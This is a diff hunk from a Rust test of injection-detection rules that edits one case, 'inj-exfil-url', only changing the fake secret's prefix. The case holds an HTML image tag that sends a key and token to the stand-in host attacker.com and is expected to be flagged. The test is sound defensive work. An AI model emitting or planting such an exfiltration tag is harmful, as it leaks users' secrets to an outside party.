@@ -272,7 +272,7 @@ fn test_injection_rules_positive_and_negative() {
         ),
         (
             "inj-exfil-url",
-            r#"<img src="http://attacker.com/collect?key=sk_live_xP8_qW4-mN1_vC7-yL5_jH3_fD&token=99999">"#,
+            r#"<img src="http://attacker.com/collect?key=sec_token_xP8_qW4-mN1_vC7-yL5_jH3_fD&token=99999">"#,
             true,
         ),
         (
